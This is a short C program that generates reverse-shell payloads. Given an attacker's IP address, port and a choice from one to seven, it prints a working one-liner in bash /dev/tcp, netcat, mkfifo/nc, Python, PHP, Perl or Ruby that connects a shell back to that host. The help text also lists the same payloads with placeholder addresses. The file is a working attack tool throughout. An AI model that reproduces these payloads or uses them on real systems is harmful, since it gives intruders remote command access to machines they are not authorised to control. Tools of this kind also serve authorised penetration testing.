#include <stdio.h>
#include <string.h>

void print_error(){

    printf("Usage: [IP ADDRESS] [PORT] [NUMBER OF PAYLOAD]\n\n");
    printf("Payload list:\n");
    printf("1. bash -i >& /dev/tcp/xx.x.x.x/xxxx 0>&1\n");
    printf("2. nc -e /bin/bash xx.x.x.x xxxx\n");
    printf("3. rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc xx.x.x.x xxxx >/tmp/f\n");
    printf("4. python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK...\n");
    printf("5. php -r '$sock=fsockopen(\"10.0.0.1\",1234);exec(\"/bin/sh -i <&3 >&3 2>&3\");'\n");
    printf("6. perl -e 'use Socket;$i=\"xx.x.x.x\";$p=xxxx;socket(S,PF_INET,SOCK_STREAM,getprotobyname...\n");
    printf("7. ruby -rsocket -e'f=TCPSocket.open(\"xx.x.x.x\",xxxx).to_i;exec sprintf(\"/bin/sh -i <&%%d >&%%d 2>&%%d\",f,f,f)'\n");

}

int main(int argc, char * argv[]){

    if(argc != 4 || strlen(argv[1]) > 40 || strlen(argv[2]) > 5 || strlen(argv[3]) != 1) {

      print_error();

      return -1;
      
    }

    switch(argv[3][0]){

      case '1':
        printf("bash -i >& /dev/tcp/%s/%s 0>&1\n", argv[1], argv[2]);
        break;
      case '2':
        printf("nc -e /bin/bash %s %s\n", argv[1], argv[2]);
        break;
      case '3':
        printf("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %s >/tmp/f\n", argv[1], argv[2]);
        break;
      case '4':
        printf("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%s\",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n", argv[1], argv[2]);
        break;
      case '5':
        printf("php -r '$sock=fsockopen(\"%s\",%s);exec(\"/bin/sh -i <&3 >&3 2>&3\");'\n", argv[1], argv[2]);
        break;
      case '6':
        printf("perl -e 'use Socket;$i=\"%s\";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'\n", argv[1], argv[2]);
        break;
      case '7':
        printf("ruby -rsocket -e'f=TCPSocket.open(\"%s\",%s).to_i;exec sprintf(\"/bin/sh -i <&%%d >&%%d 2>&%%d\",f,f,f)'\n", argv[1], argv[2]);
        break;
      default:
        printf("Wrong option");

    }

    return 0;

}
